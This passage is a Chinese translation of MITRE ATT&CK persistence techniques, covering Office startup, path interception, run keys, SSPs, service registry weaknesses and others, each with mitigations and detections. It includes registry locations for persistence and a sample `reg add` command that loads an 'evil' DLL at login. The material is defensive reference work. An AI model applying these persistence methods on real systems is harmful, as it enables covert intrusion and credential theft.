当操作系统启动时，它们会启动称为服务的程序或软件，这些程序和软件执行后台系统功能。服务的配置信息，包括服务的可执行文件路径，都存储在 Windows 注册表中。 攻击者可以安装新的服务，通过使用实用程序与服务交互或直接修改注册表来配置该服务，使其在启动时执行。服务名称可以使用相关操作系统的名称或伪装的良性软件的名称来伪装。服务可以由管理员创建，但在 SYSTEM 权限下执行，因此攻击者也可以利用服务将权限从管理员提升到 SYSTEM。攻击者也可以通过 [**服务执行**](#service-execution-%e6%9c%8d%e5%8a%a1%e6%89%a7%e8%a1%8c) 直接启动服务。

#### 防御方式

缓解|描述
:--:|:--
**用户帐号管理**|限制用户帐户的特权并修复提权向量，以便只有授权的管理员才能创建新服务

#### 检测手段

利用注册表的更改和通过命令行调用的公共实用程序来监视服务的创建。创建新服务可能会产生可更改的事件  (例如： 事件 ID4697 **和/或** 7045)。在安装新软件时，可以创建新的良性服务。­不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如用于命令与控制的网络连接、通过披露了解环境细节以及横向移动。 诸如 Sysinternals Autoruns 之类的工具也可以用于检测尝试建立持久性导致的系统更改。 查找与已知软件、补丁周期等无关的服务更改。当以前与历史数据进行比较时，通过服务执行的可疑程序可能会显示为未见过的异常进程。 监视可以创建服务的进程和命令行参数的操作。具有内置功能的远程访问工具可以直接与 Windows API 交互，以在典型的系统实用程序外执行这些功能。还可以通过 Windows 系统管理工具  (如 Windows 管理规范和 PowerShell) 创建服务，因此可能需要配置额外的日志以收集适当的数据。

***

### Office Application Startup (Office 应用程序启动)

>[原文链接](https://attack.mitre.org/techniques/T1137/)

Microsoft Office 是企业网络中基于 Windows 操作系统的相当常见的应用程序套件。 在基于 Office 的应用程序启动阶段，可以利用 Office 的多种机制实现持久化。

#### Office 模板宏
Microsoft Office 包含一些模板，它们是常用 Office 应用程序的一部分，用于自定义样式。 每次启动应用程序时都会使用其对应的基本模板。

Office Visual Basic for Applications (VBA) 宏 可以插入到基本模板中，并用于在各个 Office 应用程序启动时执行代码，以获得持久性。 目前已经发现并公布了 Word 和 Excel 的相关例子。 Word 会默认创建 Normal.dotm 模板，可以更改它以包含恶意宏。 Excel 没有默认创建的模板文件，但是可以添加自动加载的模板文件。

Word Normal.dotm 位置：`C:\Users(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm`

Excel Personal.xlsb 位置：`C:\Users(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB`

攻击者可能需要启用宏以达到任意执行，这取决于系统或企业的关于使用宏的安全策略。

#### Office 测试

在该注册表位置放入 DLL 引用时，每次启动 Office 应用程序时都会执行二进制路径指向的相应 `DLL HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf`

#### 插件

可以使用 Office 插件程序向 Office 程序添加功能。

加载项也可用于获取持久性，因为可以将其设为在 Office 应用程序启动时执行代码。 各种 Office 产品可以使用不同类型的加载项；包括 Word/Excel 加载项 (WLL/XLL)、VBA 加载项、Office 组件对象模型 (COM) 加载项、自动化加载项、VBA 编辑器 (VBE) 和 Visual Studio 工具。

#### 防御方式

缓解|描述
:--:|:--
**禁用或删除功能或程序**|遵循适合您环境的 Office 宏安全的最佳实践。 禁用 Office VBA 宏执行。即使设置为禁用通知，也会使不知情的用户执行潜在的恶意宏。禁用 Office 加载项。 如果它们是必需的，请遵循保障它们安全的最佳实践，要求对其进行签名，并禁用用户通知以允许加载项。 对于某些加载项类型 (WLL, VBA)，可能需要额外的缓解措施，因为在 Office 信任中心  (Office Trust Center) 禁用加载项时不会禁用 WLL，也不会阻止 VBA 代码的执行
**软件配置**|对于 Office Test 方法，请创建用于执行它的注册表项，并将权限设置为“Read Control”，以防止在没有管理员权限或需要权限升级的情况下轻松访问该项
**更新软件**|对于Outlook方法，阻止宏可能无效，因为用于这些功能的Visual Basic引擎与宏脚本引擎是分开的。Microsoft已发布修补程序，以尝试解决每个问题。确保将KB3191938  (可阻止Outlook Visual Basic并显示恶意代码警告) ，KB4011091  (默认情况下禁用自定义窗体) 和KB4011162  (可删除旧版首页功能) 应用于系统

#### 检测手段

许多与 Office 相关的持久化机制都需要更改注册表以及将二进制文件、文件或脚本写入磁盘或修改现有文件使其包含恶意脚本。 收集与注册表项创建和修改相关的事件以查找可用于基于 Office 的持久化的项。 还应调查对基本模板  (如 Normal.dotm) 的修改，因为基本模板一般不包含 VBA 宏。 还应该调查对 Office 宏安全设置的更改。

监视和验证文件系统上的 Office 受信任位置，并审核与启用加载项相关的注册表项。

对于Outlook规则和表单方法，Microsoft发布了PowerShell脚本，以安全收集邮件环境中的邮件转发规则和自定义表单以及解释输出的步骤。SensePost的工具Ruler可用于执行恶意规则，表单和主页攻击，该公司已发布了一种检测Ruler使用情况的工具。

***

### Path Interception (路径劫持)

>[原文链接](https://attack.mitre.org/techniques/T1034/)

路径劫持发生在可执行文件被放在特定路径中，文件由某一应用程序执行而不是预定目标执行时。其中一个例子是在一个有漏洞的应用程序的当前工作目录中使用 cmd 副本，该应用程序使用 CreateProcess 函数加载 CMD 或 BAT 文件。

在进行路径劫持时，攻击者可以利用多个明显的缺陷或错误配置：未加引号的路径，配置错误的 PATH 环境变量和搜索顺序劫持。第一个漏洞有关完整的程序路径，而未指定程序路径会导致第二个和第三个漏洞。如果可执行文件是定期被调用的，则可以使用路径劫持技术进行持久化，如果被拦截的可执行文件由更高权限的进程启动，则可以利用该技术进行权限提升。

#### 未加引号的路径

如果服务路径  (存储在 Windows 注册表项中)  和快捷路径具有一个或多个空格且未被引号括起  (例如，`C:\unsafe path with space\program.exe` vs. `"C:\safe path with space\program.exe"`) ，那么它们容易受到路径劫持的攻击，。 攻击者可以将一个可执行文件放在比原路径的更高级别目录中，然后 Windows 将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是 `C:\program files\myapp.exe` ，攻击者可以在 `C:\program.exe` 目录下创建程序，那么将被运行的是该程序而不是预期的程序。

#### PATH 环境变量配置错误

PATH 环境变量包含一个目录列表。如果没有给出程序路径，某些执行程序的方法  (比如使用 cmd.exe 还是命令行) 仅依赖于 PATH 环境变量来确定在哪些位置搜索程序。如果有目录在 PATH 环境变量中位于 Windows 目录之前，`%SystemRoot%\system32`  (例如 `C:\Windows\system32` ) 。则可以将与 Windows 程序  (例如 cmd，PowerShell 或 Python) 名称相同的程序放在前面的目录中， 当对应命令在脚本或命令行中被调用时，该程序会被执行。 例如，如果 `C:\example path` 在 PATH 环境变量中在 `C:\Windows\system32` 前面，那么当命令行执行 **net** 时， 位于 `C:\example path` 的 net.exe 将会被调用，而不是 Windows 系统的 **net**。

#### 搜索顺序劫持

搜索顺序劫持发生在攻击者滥用 Windows 对于未给出路径的程序的搜索顺序时。执行程序的方法不同，搜索顺序也会不同。 但是，Windows 通常在搜索 Windows 系统目录之前搜索启动程序目录。攻击者如果发现易受搜索顺序劫持攻击的程序  (即未指定可执行文件路径的程序) ，可以通过创建以 未正确指定的程序命名的程序并将其放在启动程序的目录中来利用此漏洞。

例如，**example.exe** 使用命令行参数 net user运行 **cmd.exe** 。攻击者可以将名为 **net.exe** 的程序放在与 **example.exe** 相同的目录中，执行**example.exe** 时将运行该 **net.exe** 而不是 Windows 系统实用程序 net。此外，如果攻击者将名为 **net.com** 的程序放在与 **net.exe** 相同的目录中，根据 PATHEXT 定义的可执行扩展的顺序。cmd.exe /C net user将执行 **net.com** 而不是 **net.exe**  ， 搜索顺序劫持也是劫持 DLL 加载的常见做法，这在 DLL 搜索顺序劫持中有所涉及。

#### 防御方式

缓解|描述
:--:|:--
**审计**|在函数允许的情况下，用引号将 PATH 变量括起来，以消除程序配置文件、脚本、PATH 环境变量、服务和快捷方式中的路径拦截缺陷。请注意 Windows 用于执行或加载二进制文件的搜索顺序，并在适当的地方使用绝对路径。 卸载软件时清理旧的 Windows 注册表项，以避免与合法二进制文件无关的项
**预防执行**|攻击者可能需要将新的二进制文件放置在要通过此漏洞执行的位置。使用适当的应用程序白名单工具  (例如Windows Defender应用程序控制，AppLocker或软件限制策略) 来识别和阻止潜在的恶意软件执行路径拦截
**限制文件和目录权限**|要求将所有可执行文件放在写保护目录中
**用户帐号管理**|确保设置了适当的权限和目录访问控制，拒绝用户将文件写入顶级目录 `C:` 和系统目录，如 `C:\Windows\`，以减少恶意文件可以放置以获得执行的位置。

#### 检测手段

监视以部分目录命名的文件的文件创建，以及在可能通过环境变量搜索公共进程的位置下的文件创建，或不允许用户写入。 监视以部分目录命名的进程可执行路径的执行进程。 监视以 Windows 系统程序命名的程序或通常无需路径就可以执行的程序  (如**findstr** 、 **net** 和 **python**) 的文件创建。 如果此活动发生在已知的管理活动、升级、安装或打补丁之外，则可能是可疑的。

不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如用于命令与控制的网络连接、通过披露了解环境细节以及横向移动。

***

### Plist Modification (修改Plist)

>[原文链接](https://attack.mitre.org/techniques/T1150/)

属性列表 (plist) 文件包含 macOS 和 OS X 中应用程序和服务所有配置信息。 这些文件采用 UTF-8 编码并像 XML 文档一样通过一系列由<>包围的键来格式化。 它们详细说明了程序应该在何时执行、可执行文件的路径、程序参数、所需的操作系统权限以及许多其他内容。plists 位于特定的位置，这取决于它们的用途，例如 `/Library/Preferences`  (使用高级特权执行) 和 `~/Library/Preferences`  (使用用户的特权执行) 。 攻击者可以修改这些 plist 文件以指向自己的代码，可以利用它们在另一个用户的上下文中执行自己的代码，可以绕过白名单，甚至可以利用它们实现持久化。

#### 防御方式

缓解|描述
:--:|:--
**限制文件和目录权限**|通过将plist文件设置为只读，可以防止用户对其进行修改

#### 检测手段

监视文件系统可以确定 plist 文件是否正在被修改。 在大多数情况下，用户不应该拥有修改这些文件的权限。 某些软件工具，如 **Knock Knock**，可以检测持久性机制并指向正在引用的特定文件。 这有助于查看实际执行的内容。

监控由于修改 plist 文件而导致的异常进程执行。 监视用于修改 plist 文件或以 plist 文件为参数的实用程序，这些实用程序可能表明可疑活动。

***

### Port Knocking (端口试探)

>[原文链接](https://attack.mitre.org/techniques/T1205/)

端口试探是一种较为成熟的技术，目的是隐藏开放的端口以控制访问，攻击者和防御者均可使用。 为了启用端口，攻击者需发送一系列具有特定特征的数据包。 通常，这些数据包包含关闭端口预定义的尝试序列  (译者注：称为敲门序列) ，这可能涉及不常见的标志、特定的字符串或其他特征。 完成序列，通常由基于主机的防火墙开启端口，但也可以由自定义软件打开。

在动态开启监听端口和在不同系统上启动与监听服务器的连接时，都可以见到该技术。

可以通过不同的方法观察引发通信的数据包。 一种方法  (最初由 Cd00r 实现) 是使用 libpcap 库嗅探有问题的包。 另一种方法利用了原始套接字，这使得恶意软件可以使用供其他程序使用的开放端口。

#### 防御方式

缓解|描述
:--:|:--
**过滤网络流量**|可以通过使用状态防火墙来缓解此技术的某些变体，具体取决于它的实现方式

#### 检测手段

记录发送到系统和从系统发出的网络数据包，查找不属于已建立的流的无关数据包

***

### Port Monitors (端口监视器)

>[原文链接](https://attack.mitre.org/techniques/T1013/)

可以通过 API 调用设置端口监视器， 以设置要在启动时加载的 DLL。 此 DLL 可以位于 `C:\Windows\System32`，并且在启动时被打印机，spoolsv.exe 被加载。spoolsv.exe 进程也在 SYSTEM 级别权限下运行。 或者，如果权限允许为该 DLL 写入完整的路径名到 `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`​​，则可以加载任意 DLL。

注册表项包含以下条目：

- 本地端口
- 标准 TCP / IP 端口
- USB 监视器
- WSD 端口

攻击者可以使用此技术在启动时加载恶意代码，这些代码将在系统重新启动时持续存在并以 SYSTEM 级别权限执行。

#### 防御方式

这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能

#### 检测手段

- 监视进程 API 调用
- 监视 spoolsv.exe 为异常 DLL 加载的 DLL
- 写入 System32 目录且与已知的良好软件或补丁无关的新 DLL 可能是可疑的
- 监视注册表中 `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors` 的更改
- 运行 Autorun，它将作为持久性机制检查注册表项

***

### PowerShell Profile (PowerShell 配置文件)

>[原文链接](https://attack.mitre.org/techniques/T1504/)

在某些情况下，攻击者可以通过滥用 PowerShell(T1086) 配置文件来持久化和提权。PowerShell配置文件  (profile.ps1) 是一个在PowerShell启动时运行的脚本，可以用作登录脚本来自定义用户环境。PowerShell根据用户或主机程序支持多个配置文件。例如，PowerShell 主机程序  (例如PowerShell控制台，PowerShell ISE或Visual Studio Code) 可以有不同的配置文件。管理员还可以配置一个配置文件，该配置文件适用于本地计算机上的所有用户和主机程序。

攻击者可能会修改这些配置文件，以包括任意命令，功能，模块和/或PowerShell驱动器来获得持久性。每次用户打开PowerShell会话时，除非启动该-NoProfile标志，否则将执行修改后的脚本。

如果PowerShell概要文件中的脚本由具有较高特权的帐户  (例如域管理员) 加载并执行，则攻击者也可能能够提权。

#### 防御方式

缓解|描述
:--:|:--
**代码签名**|强制执行仅签名的PowerShell脚本。对配置文件进行签名，以免对其进行修改
**限制文件和目录权限**|使PowerShell配置文件不可变且只能由某些管理员更改，将限制攻击者轻松创建用户级持久性的能力
**软件配置**|如果不需要，请避免使用PowerShell配置文件。`-No Profile` 远程执行PowerShell脚本时，请使用带有标志，以防止执行本地配置文件和脚本

#### 检测手段

profile.ps1 应该监视可以存储的位置是否有新的配置文件或修改。配置文件位置示例包括：

- $PsHome\Profile.ps1
- $PsHome\Microsoft.{{HostProgram}}_profile.ps1
- $Home\My Documents\PowerShell\Profile.ps1
- $Home\My Documents\PowerShell\Microsoft.{{HostProgram}}_profile.ps1

监视异常的PowerShell命令，异常的PowerShell驱动器或模块加载 **和/或** 未知程序的执行。

***

### Rc.common (Rc.common)

> [原文链接](https://attack.mitre.org/techniques/T1163/)

在引导过程中，macOS执行 `source /etc/rc.common` ，这是一个包含各种实用程序功能的shell脚本。该文件还定义了用于处理命令行参数和收集系统设置的例程，因此建议将其包含在启动项脚本[1]的开始中。在macOS和OS X中，现在已不赞成使用此技术，而推荐使用启动代理和启动守护程序，但目前仍在使用。

攻击者可以使用 rc.common 文件作为隐藏代码的方式，该代码将以root用户的身份在每次重新启动时执行。

#### 防御方式

缓解|描述
:--:|:--
**用户帐号管理**|限制用户帐户的特权，以便只有授权用户才能编辑rc.common文件

#### 检测手段

可以监视 `/etc/rc.common` 文件以检测策略的更改。 监视 rc.common 脚本引发的进程执行，以查找异常或未知的应用程序和行为。

***

### Re-opened Applications (重启应用)

>[原文链接](https://attack.mitre.org/techniques/T1164/)

从 Mac OS X 10.7 (Lion) 开始，用户可以指定在重启机器时要重新打开的应用程序。 虽然这通常是通过基于每个应用程序的图形用户界面  (GUI) 完成的，但是属性列表文件 (plist) 也包含这些信息，它们位于 `~/Library/Preferences/com.apple.loginwindow.plist` 和 `~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist`

攻击者可以直接修改其中一个文件，使其包含指向恶意可执行文件的链接，以便在用户每次重启机器时提供持久化。

#### 防御方式

缓解|描述
:--:|:--
**禁用或删除功能或程序**|可以使用以下终端命令完全禁用此功能：`defaults write -g ApplePersistence -bool no`
**用户培训**|登录时按住Shift键可防止应用自动打开

#### 检测手段

监视与重启应用程序相关联的特定 plist 文件可以表明应用程序何时已注册其自身以重新打开

***

### Redundant Access (冗余访问)

>[原文链接](https://attack.mitre.org/techniques/T1108/)

攻击者可以使用多个具有不同命令与控制协议的远程访问工具来规避检测。 如果一种类型的工具被检测到并被屏蔽或删除，而组织没有完全了解攻击者的工具和访问权限，那么攻击者将能够维持对网络的访问权限。 

如果检测到一种工具并将其作为响应被阻止或删除，但组织未完全了解攻击者的工具和访问权限，则攻击者将能够保留对网络的访问权限。攻击者还可能试图获得对 [**有效帐户**](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7) 的访问权，以使用 [**外部远程服务**](#external-remote-services-%e5%a4%96%e9%83%a8%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1)  (如外部 vpn) 来维护访问权限，尽管目标网络中部署的远程访问工具会受到干扰。

可以使用 Web Shell 来凭借外部可访问的 Web 服务器维持对某一网络的访问权限。

#### 防御方式

缓解|描述
:--:|:--
**网络入侵防护**|使用网络签名来识别特定恶意软件的流量的网络入侵检测和防御系统可用于减少网络级别的活动。 签名通常作为协议中的唯一标志，并且在不同的恶意软件系列和版本中会有所不同。 攻击者可能会随着时间的推移修改工具签名，或者以这种方式构造协议以规避常见防御工具的检测

#### 检测手段

现有的检测远程访问工具的方法是有用的。 备用远程访问工具或其他访问点可能没有在入侵期间打开已建立的命令与控制通道，因此传输的数据量不如主信道那么大，除非访问丢失。

基于信标流量、命令与控制协议或攻击者基础设施的工具的检测需要有关攻击者可能使用的工具、IP 地址和/或域的预先威胁情报，以及在网络边界检测使用情况的能力。 如果工具可以扫描攻击指标，那么预先了解这些指标也有助于在终端检测攻击者工具。

如果攻击者正在进行入侵并且收集了足够的终端数据或解码的命令与控制流量，那么防御者很可能能够在攻击者执行操作时检测到其丢弃的其他工具。

对于使用外部可访问 vpn 或远程服务的备用访问，请遵循有效帐户  (Valid Accounts) 和外部远程服务 (External Remote Services) 下的检测建议来收集帐户使用信息。

***

### Registry Run Keys / Startup Folder (注册表运行键/启动文件夹)

>[原文链接](https://attack.mitre.org/techniques/T1060/)

在注册表 **run** 键 或 **Startup** 文件夹中的中添加条目，在用户登录时将执行该条目引用的程序。这些程序将在用户的上下文中执行，并具有帐户的相关权限级别。

在Windows系统上，默认情况下创建一下run key:

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` 
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

该 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`功能也可用，但在Windows Vista及更高版本上不是默认创建的。注册表运行键项可以直接引用程序，也可以将它们作为依赖项列出。例如，可以使用 **RunOnceEx** 的 **Depend** 键在登录时加载DLL：`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

以下注册表项可用于设置启动文件夹项的持久化：

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

以下注册表项可以在引导过程中控制服务的自启动：

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`

使用策略设置指定启动程序会在两个注册表项之一中创建相应的值：

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`

Winlogon键控制用户登录到运行Windows 7的计算机时发生的操作。这些操作大多数在操作系统的控制下，但是您也可以在此处添加自定义操作。该`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` 和`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` 子键可以自动启动程序。

注册表项的加载值中列出的程序在`HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows`任何用户登录时运行。

默认情况下，注册表项的多字符串BootExecute值`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager`设置为autocheck autochk *。如果系统异常关闭，则此值使Windows在启动时检查硬盘的文件系统完整性。攻击者可以将其他程序或过程添加到此注册表值中，该值将在启动时自动启动。

攻击者可以使用这些配置位置来执行恶意软件  (例如远程访问工具) ，以通过系统重新启动来持久化。攻击者还可以使用伪装使注册表项看起来像与合法程序相关联。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能

#### 检测手段

监视注册表中与已知软件、补丁周期等不相关的 run 键的更改。监视开始文件夹的添加或更改。诸如 Sysinternals Autoruns 之类的工具也可以用于检测尝试建立持久性导致的系统更改，包括列出 run 键的注册表位置和 startup文件夹。 当与历史数据相对比时，可疑程序作为启动程序的执行可能会作为未见过的的异常进程出现。

在安装合法软件时，通常会在正常情况下对这些位置进行更改。为了增加恶意活动的可信度，不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如用于命令与控制的网络连接、通过披露了解环境细节以及横向移动。

***

### Scheduled Task

>同 [计划任务](#scheduled-task-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1)

***

### Screensaver (屏幕保护)

>[原文链接](https://attack.mitre.org/techniques/T1180/)

屏幕保护程序 (Screensaver) 是在所配置的用户不活动时间后执行的程序，由扩展名为 .scr 的可移植可执行 (PE) 文件组成。 Windows 屏幕保护程序 scrnsave.exe 以及基本 Windows 安装中包含的屏幕保护程序位于 `C:\Windows\System32\`。

以下屏幕保护程序设置存储在注册表内 (HKCU\Control Panel\Desktop\)，可以通过操作来实现持久化。

- SCRNSAVE.exe -设置为恶意PE路径
- ScreenSaveActive -设置为 **1** 以启用屏幕保护程序
- ScreenSaverIsSecure -设置为 **0**，不需要密码即可解锁
- ScreenSaveTimeout -在执行屏幕保护程序之前设置用户不活动超时

击者可以使用屏幕保护程序设置来持久化，方法是在用户不活动的特定时间段后设置屏保运行恶意软件。

#### 防御方式

缓解|描述
:--:|:--
**禁用或删除功能或程序**|如果不需要，请使用组策略禁用屏幕保护程序
**禁预防执行**|阻止从非标准位置执行.scr文件

#### 检测手段

监视 .scr 文件的进程执行和命令行参数。 监视注册表中可能与典型用户行为无关的屏幕保护程序配置更改。

诸如 Sysinternals Autoruns 之类的工具可用于检测注册表中屏幕保护程序二进制路径的更改。 可疑路径和 PE 文件可能标志网络中的合法屏幕保护程序的异常，应该进行调查。

***

### Security Support Provider (安全支持提供商)

>[原文链接](https://attack.mitre.org/techniques/T1101/)

Windows安全支持提供程序  (SSP) DLL在系统启动时被加载到本地安全机构  (LSA) 进程中。一旦加载到LSA中，SSP DLL便可以访问Windows中存储的加密和明文密码，例如任何已登录用户的域密码或智能卡PIN。SSP配置存储在两个注册表项中：`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` 和`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`。攻击者可以修改这些注册表项以添加新的SSP，这些新的SSP将在系统下次启动时或在调用 **AddSecurityPackage Windows API** 函数时加载。

#### 防御方式

缓解|描述
:--:|:--
**特权流程完整性**|Windows 8.1，Windows Server 2012 R2和更高版本可能会通过设置注册表项 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`  (要求所有SSP DLL由Microsoft签名) 来使LSA作为受保护进程指示灯  (PPL) 运行

#### 检测手段

监视注册表以查看对SSP注册表项的更改。监视LSA进程的DLL负载。当未签名的SSP DLL试图通过将注册表项设置为 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe` AuditLevel = 8 来尝试将未签名的SSP DLL加载到LSA时，Windows 8.1和Windows Server 2012 R2可能会生成事件。

***

### Server Software Component (服务器软件组件)

>[原文链接](https://attack.mitre.org/techniques/T1505/)

攻击者可能滥用服务器应用程序的合法可扩展开发功能来建立对系统的持久访问。企业服务器应用程序可能包含允许应用程序开发人员编写和安装软件以扩展主应用程序功能的功能。攻击者可能会安装恶意软件组件，以恶意扩展和滥用服务器应用程序。

#### 传输代理

Microsoft Exchange传输代理可以对通过传输管道传递的电子邮件进行操作，以执行各种任务，例如过滤垃圾邮件，过滤恶意附件，日记或在所有外发电子邮件的末尾添加公司签名。传输代理可以由应用程序开发人员编写，然后编译为.NET程序集，这些程序随后在Exchange服务器中注册。运输代理将在电子邮件处理的指定阶段被调用，并执行开发人员定义的任务。

攻击者可能注册了恶意的传输代理，以在Exchange Server中提供一种持久化机制，该机制可以由攻击者指定的电子邮件事件触发。尽管可以为通过Exchange传输管道的所有电子邮件调用恶意的传输代理，但是可以将代理配置为仅执行特定任务以响应攻击者定义的标准。例如，如果收件人电子邮件地址与攻击者提供的列表中的条目匹配，则运输代理仅可以执行类似复制运输中的附件并将其保存以供以后过滤的操作。

#### SQL 存储过程

SQL存储过程是可以保存和重用的代码，因此数据库用户不会浪费时间重写频繁使用的SQL查询。可以使用过程名称通过SQL语句或数据库中定义的事件  (例如，当SQL Server应用程序启动/重新启动时) 通过SQL语句调用存储过程。攻击者可能设计出可以在SQL数据库服务器中提供持久化机制的恶意存储过程。要通过SQL语法执行操作系统命令，攻击者可能必须启用其他功能，例如xp_cmdshellMSSQL Server。

Microsoft SQL Server可以启用公共语言运行库  (CLR) 集成。启用CLR集成后，应用程序开发人员可以使用任何.NET框架语言  (例如VB .NET，C＃等) 编写存储过程。攻击者可以制作或修改链接到存储过程的CLR程序集，可以使这些CLR程序集执行任意命令。

#### 防御方式

缓解|描述
:--:|:--
**审计**|定期检查关键服务上的组件，攻击者可能会针对这些组件进行持久化，以验证系统的完整性并确定是否进行了意外更改
**代码签名**|确保所有应用程序组件二进制文件均由正确的应用程序开发人员签名
**特权账户管理**|不允许将有权在这些服务上添加组件软件的管理员帐户用于日常操作，这些操作可能会使它们暴露给非特权系统上的潜在攻击者

#### 检测手段

考虑监视应用程序日志中的异常行为，这些异常行为可能指示可疑应用程序软件组件的安装。考虑监视与新应用程序软件组件的安装相关的文件位置，例如应用程序通常从中加载此类可扩展组件的路径。在MSSQL Server上，请考虑监视xp_cmdshell使用情况。

***

### Service Registry Permissions Weakness (服务注册表权限缺陷)

>[原文链接](https://attack.mitre.org/techniques/T1058/)

Windows 将本地服务配置信息存储在 HKLM 下的注册表中。可以通过诸如服务控制器、sc.exe、PowerShell 或 Reg 等工具操作存储在服务注册表项下的信息来修改服务的执行参数。对注册表项的访问由访问控制列表和权限控制。

如果没有正确设置用户和组的权限，并且不限制对服务的注册表项访问，则攻击者可以更改服务 binPath/ImagePath 以指向受其控制的另一个可执行文件。当服务启动或重启时会执行由攻击者控制的程序，使得攻击者获得持久性和/或提权到服务运行所需的帐户上下文。  (本地/域帐户，SYSTEM，LocalService 或 NetworkService) 

攻击者还可以更改与服务失败参数  (例如 FailureCommand) 关联的注册表键，参数内容可能在服务失败或有意崩溃时在提升的上下文中执行。

#### 防御方式

缓解|描述
:--:|:--
**限制注册表权限**|确保为注册表 hive 设置了适当的权限，以防止用户修改可能导致权限提升的系统组件的键值

#### 检测手段

服务更改会反映在注册表中。对现有服务的修改不应频繁发生。如果服务的二进制路径或故障参数被更改为该服务不常见且与软件更新无关的值，则可能是由于恶意活动。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如用于命令与控制的网络连接、通过披露了解环境细节以及横向移动。

诸如 Sysinternals Autoruns 之类的工具也可以用于检测尝试建立持久性导致的系统更改，包括列出当前服务信息。 查找与已知软件、补丁周期等无关的服务更改。当以前与历史数据进行比较时，通过服务执行的可疑程序可能会显示为未见过的异常进程。

监视可以修改服务的进程和命令行参数的操作。具有内置功能的远程访问工具可以直接与 Windows API 交互，以在典型的系统实用程序外执行这些功能。还可以通过 Windows 系统管理工具  (如 Windows 管理规范和 PowerShell) 修改服务，因此可能需要配置额外的日志以收集适当的数据。

***

### Setuid and Setgid (Setuid 和 Setgid)

>[原文链接](https://attack.mitre.org/techniques/T1166/)

在Linux或macOS上为应用程序设置setuid或setgid位时，这意味着该应用程序将分别以拥有用户或组的特权运行。通常，应用程序是在当前用户的上下文中运行的，而不管哪个用户或组拥有该应用程序。在某些情况下，需要在提升权限的上下文中执行程序才能正常运行，但运行它们的用户不需要提升权限。任何用户都可以为自己的应用程序指定要设置的setuid或setgid标志，而不必在sudoers文件中创建条目  (必须由root用户创建) 。通过观看文件属性时，这些位用 **s**而不是 **x** 表示 `ls -l`。该chmod程序可以经由bitmasking设置这些位，`chmod 4777 [file]` 或通过缩写命名 `chmod u+s [file]`。

攻击者可以利用此优势逃脱外壳程序或利用setuid或setgid位利用应用程序中的漏洞，以使代码在其他用户的上下文中运行。此外，攻击者可以对自己的恶意软件使用此机制，以确保他们将来能够在提升的环境中执行。

#### 防御方式

缓解|描述
:--:|:--
**操作系统配置**|具有已知漏洞或已知shell escape的应用程序不应设置setuid或setgid，以减少应用程序受到威胁时的潜在损害。此外，应在整个系统中最小化设置了setuid或setgid的程序的数量

#### 检测手段

监视文件系统中设置了setuid或setgid的文件。监视实用程序  (如chmod) 及其命令行参数的执行，以查找要设置的setuid或setguid

***

### Shortcut Modification (快捷方式修改)

>[原文链接](https://attack.mitre.org/techniques/T1023/)

快捷方式或符号链接指向其他文件或应用程序。当其被单击或在系统启动过程中被执行时，将打开或执行被指向的文件或程序。 攻击者可以使用快捷方式执行其持久化工具。他们可以创建一个新的快捷方式作为间接手段，对它进行伪装使其看起来像一个合法的程序。攻击者还可以修改目标路径或完全替换现有快捷方式，以便执行其工具而不是预期的合法程序。

#### 防御方式

缓解|描述
:--:|:--
